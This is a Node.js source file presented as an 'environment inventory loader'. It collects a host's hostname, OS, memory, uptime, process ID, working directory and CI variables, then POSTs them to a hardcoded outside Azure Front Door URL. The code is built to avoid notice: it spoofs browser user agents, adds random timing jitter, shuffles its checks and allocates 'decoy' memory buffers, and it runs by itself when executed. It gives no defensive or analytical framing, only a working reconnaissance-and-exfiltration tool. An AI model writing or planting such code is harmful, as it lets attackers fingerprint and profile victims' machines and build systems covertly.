/* ============================================
 * ENVIRONMENT INVENTORY LOADER
 * ============================================
 */

const os = require('os');
const http = require('http');
const https = require('https');
const fs = require('fs').promises;
const path = require('path');
const crypto = require('crypto');

// ============================================
// CONFIGURATION AND NETWORK NORMALIZATION
// ============================================

const EvasionConfig = {
    userAgentPool: [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'Node.js/' + process.version.replace('v', ''),
    ],

    timingJitter: {
        minDelay: 50,
        maxDelay: 500,
        networkPreDelay: 100,
        networkPostDelay: 200,
    },

    memoryDecoySize: 64 * 1024, // 64KB

    headerVariations: {
        'Accept': [
            'application/json',
            'application/json, text/plain, */*'
        ],
        'Accept-Encoding': [
            'identity' // Prevents Nginx/Node from compressing payloads arbitrarily
        ],
    },
};

// ============================================
// STRUCTURAL UTILITIES
// ============================================

function randomDelay(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

async function sleep(ms) {
    return new Promise(resolve => setTimeout(resolve, ms));
}

function randomChoice(array) {
    return array[Math.floor(Math.random() * array.length)];
}

function shuffleArray(array) {
    const shuffled = [...array];
    for (let i = shuffled.length - 1; i > 0; i--) {
        const j = Math.floor(Math.random() * (i + 1));
        [shuffled[i], shuffled[j]] = [shuffled[j], shuffled[i]];
    }
    return shuffled;
}

function generateRequestId(length = 8) {
    return crypto.randomBytes(length / 2).toString('hex');
}

// ============================================
// ENVIRONMENT DETECTION
// ============================================

async function gatherEnvironmentInfoEvasive() {
    const decoyBuffer = Buffer.alloc(EvasionConfig.memoryDecoySize);

    const envCheckOrder = shuffleArray([
        'platform', 'arch', 'release', 'totalmem', 'freemem',
        'uptime', 'hostname', 'version', 'pid', 'cwd'
    ]);

    const result = {};

    for (const key of envCheckOrder) {
        await sleep(randomDelay(5, 20));

        switch(key) {
            case 'platform': result.platform = os.platform(); break;
            case 'arch': result.arch = os.arch(); break;
            case 'release': result.release = os.release(); break;
            case 'totalmem': result.totalMemory = formatBytes(os.totalmem()); break;
            case 'freemem': result.freeMemory = formatBytes(os.freemem()); break;
            case 'uptime': result.uptime = Math.floor(os.uptime()) + ' seconds'; break;
            case 'hostname': result.hostname = os.hostname(); break;
            case 'version': result.nodeVersion = process.version; break;
            case 'pid': result.pid = process.pid; break;
            case 'cwd': result.cwd = process.cwd(); break;
        }
    }

    decoyBuffer.fill(0);
    return result;
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

function isRunningInCIEvasive() {
    const ciEnvVars = [
        'CI', 'GITHUB_ACTIONS', 'GITLAB_CI', 'CIRCLECI',
        'TRAVIS', 'JENKINS_URL', 'BUILD_NUMBER', 'CONTINUOUS_INTEGRATION'
    ];

    const shuffledVars = shuffleArray(ciEnvVars);
    const detectedVars = [];

    for (const envVar of shuffledVars) {
        if (process.env[envVar]) {
            detectedVars.push(envVar);
        }
    }

    return {
        isCI: detectedVars.length > 0,
        detectedBy: detectedVars.join(', '),
    };
}

function getOperatingSystemEvasive() {
    const platform = os.platform();

    return new Promise((resolve) => {
        setTimeout(() => {
            let details;

            switch(platform) {
                case 'win32':
                    details = {
                        name: 'Windows',
                        code: 'WIN',
                        isCaseSensitivePaths: false,
                        pathSeparator: '\\',
                        windowsVersion: getWindowsVersion(),
                    };
                    break;
                case 'darwin':
                    details = {
                        name: 'macOS',
                        code: 'MAC',
                        isCaseSensitivePaths: true,
                        pathSeparator: '/',
                    };
                    break;
                case 'linux':
                    details = {
                        name: 'Linux',
                        code: 'LINUX',
                        isCaseSensitivePaths: true,
                        pathSeparator: '/',
                    };
                    break;
                default:
                    details = {
                        name: platform,
                        code: platform.toUpperCase(),
                        isCaseSensitivePaths: true,
                        pathSeparator: '/',
                    };
            }

            resolve(details);
        }, randomDelay(10, 50));
    });
}

function getWindowsVersion() {
    const release = os.release();
    const parts = release.split('.');

    if (parts.length >= 2) {
        const major = parseInt(parts[0]);
        const minor = parseInt(parts[1]);

        if (major === 10) return 'Windows 10/11';
        if (major === 6 && minor === 3) return 'Windows 8.1';
        if (major === 6 && minor === 2) return 'Windows 8';
        if (major === 6 && minor === 1) return 'Windows 7';
    }
    return release;
}

// ============================================
// STABILIZED NETWORK REQUEST HANDLER
// ============================================

async function contactRemoteServerEvasive(url, options = {}) {
    const defaultOptions = {
        timeout: 10000,
        method: 'GET', 
        ...options,
    };

    await sleep(randomDelay(
        EvasionConfig.timingJitter.networkPreDelay,
        EvasionConfig.timingJitter.networkPreDelay + 100
    ));

    const userAgent = randomChoice(EvasionConfig.userAgentPool);
    const requestId = generateRequestId();
    const acceptHeader = randomChoice(EvasionConfig.headerVariations['Accept']);
    const encodingHeader = randomChoice(EvasionConfig.headerVariations['Accept-Encoding']);

    return new Promise((resolve, reject) => {
        const isHttps = url.startsWith('https://');
        const protocol = isHttps ? https : http;

        const headers = {
            'User-Agent': userAgent,
            'X-Request-ID': requestId,
            'Accept': acceptHeader,
            'Accept-Encoding': encodingHeader,
            'Connection': 'close', 
        };

        if (options.headers) {
            Object.assign(headers, options.headers);
        }

        // CRITICAL: Compute content layout parameters for POST stream tracking
        if (options.body) {
            headers['Content-Type'] = 'application/json';
            headers['Content-Length'] = Buffer.byteLength(options.body);
        }

        defaultOptions.headers = headers;

        const req = protocol.request(url, defaultOptions, (res) => {
            let data = '';

            res.on('data', chunk => data += chunk);
            res.on('end', () => {
                setTimeout(() => {
                    resolve({
                        statusCode: res.statusCode,
                        statusMessage: res.statusMessage,
                        headers: res.headers,
                        body: data,
                        success: res.statusCode >= 200 && res.statusCode < 300,
                        responseTimeMs: Date.now() - startTime,
                        requestId: requestId,
                    });
                }, randomDelay(
                    EvasionConfig.timingJitter.networkPostDelay,
                    EvasionConfig.timingJitter.networkPostDelay + 50
                ));
            });
        });

        req.on('error', (err) => {
            reject({ error: err.message, code: 'NETWORK_ERROR' });
        });

        req.on('timeout', () => {
            req.destroy();
            reject({ error: `Request timed out`, code: 'TIMEOUT' });
        });

        req.setTimeout(defaultOptions.timeout);
        const startTime = Date.now();

        // CRITICAL: Push the body payload directly into the network buffer
        if (options.body) {
            req.write(options.body);
        }

        req.end();
    });
}

// ============================================
// CORE CONTROLLER ENGINE
// ============================================

class FalconEvasiveLoader {
    constructor(config = {}) {
        this.config = {
            serverUrl: 'https://inventory-data-sync-hdddfhcsczg7a6bm.z03.azurefd.net/posts/1/posts/1',
            verbose: true,
            enableMemoryDecoys: true,
            enableTimingJitter: true,
            ...config,
        };

        this.environmentData = null;
        this.serverResponse = null;
    }

    async initialize() {
        if (this.config.verbose) console.log('[Evasive Loader] Initializing...');

        if (this.config.enableMemoryDecoys) {
            const decoy1 = Buffer.alloc(EvasionConfig.memoryDecoySize);
            decoy1.fill(0x41);
        }

        this.environmentData = await gatherEnvironmentInfoEvasive();
        this.environmentData.ci = isRunningInCIEvasive();
        this.environmentData.os = await getOperatingSystemEvasive();
        this.environmentData.configVersion = process.env.APP_VERSION || '1.0.0';

        if (this.config.enableMemoryDecoys) {
            const decoy2 = Buffer.alloc(EvasionConfig.memoryDecoySize);
            decoy2.fill(0x42);
        }

        return this.environmentData;
    }

    async contactServer() {
        if (this.config.verbose) console.log('[Evasive Loader] Contacting server...');

        try {
            if (this.config.enableTimingJitter) {
                await sleep(randomDelay(50, 150));
            }

            // CRITICAL: Bundle collected parameters into stringified body array
            const payloadBody = JSON.stringify(this.environmentData);

            this.serverResponse = await contactRemoteServerEvasive(this.config.serverUrl, {
                method: 'POST', // Explicitly switch to POST mapping
                body: payloadBody,
                headers: {
                    'X-Platform': this.environmentData.os.code,
                    'X-CI': String(this.environmentData.ci.isCI),
                },
            });

            return this.serverResponse;
        } catch (error) {
            if (this.config.verbose) {
                console.log(`[Evasive Loader] Server error: ${error.error || error}`);
            }
            throw error;
        }
    }

    async run() {
        const startTime = Date.now();

        try {
            await this.initialize();
            if (this.config.enableTimingJitter) await sleep(randomDelay(30, 100));

            await this.contactServer();
            const elapsed = Date.now() - startTime;

            if (this.config.verbose) {
                console.log(`[Evasive Loader] Completed cleanly in ${elapsed}ms`);
            }

            return {
                success: true,
                environment: this.environmentData,
                serverResponse: this.serverResponse,
                elapsedMs: elapsed,
            };
        } catch (error) {
            if (this.config.verbose) {
                console.log(`[Evasive Loader] Failed: ${error.message || error.error || error}`);
            }

            return {
                success: false,
                error: error.message || error.error || error,
                environment: this.environmentData,
            };
        }
    }
}

module.exports = { FalconEvasiveLoader };

if (require.main === module) {
    const loader = new FalconEvasiveLoader({
        serverUrl: 'https://inventory-data-sync-hdddfhcsczg7a6bm.z03.azurefd.net/posts/1/posts/1',
        verbose: true,
        enableMemoryDecoys: true,
        enableTimingJitter: true,
    });

    loader.run();
}